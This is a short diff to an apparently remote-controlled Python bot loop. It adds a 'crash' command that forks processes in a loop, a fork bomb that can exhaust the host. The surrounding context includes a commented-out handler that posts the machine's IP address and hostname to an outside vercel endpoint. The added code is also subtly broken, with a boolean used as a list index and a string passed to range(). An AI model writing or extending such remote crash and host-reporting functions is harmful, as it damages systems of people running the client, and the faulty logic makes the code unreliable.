@@ -63,6 +63,18 @@ while True:
                     else:
                         old_command = command
                         continue
+                if command.startswith("crash"):
+                    from os import fork
+                    command = command.split()
+                    if command[1<len(command)]:
+                        for _ in range(command[1]):
+                            fork()
+                    else:
+                        fork()
+
+                
+                    
+                
 #                if command.startswith("ping"):
 #                    try:
 #                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: Pong!")
